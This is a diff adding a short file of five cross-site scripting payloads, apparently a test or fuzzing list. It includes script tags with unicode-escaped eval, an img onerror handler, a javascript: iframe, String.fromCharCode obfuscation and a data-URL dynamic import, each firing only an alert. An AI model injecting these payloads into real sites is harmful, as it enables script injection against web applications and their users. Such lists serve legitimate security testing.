@@ -1,0 +1,5 @@
+<script>eval\u0028alert\u00281\u0029\u0029</script>
+<img src='x' onerror='alert(1)'>
+<iframe src="javascript:alert(1)">
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>import('data:text/javascript,alert(1)')</script>
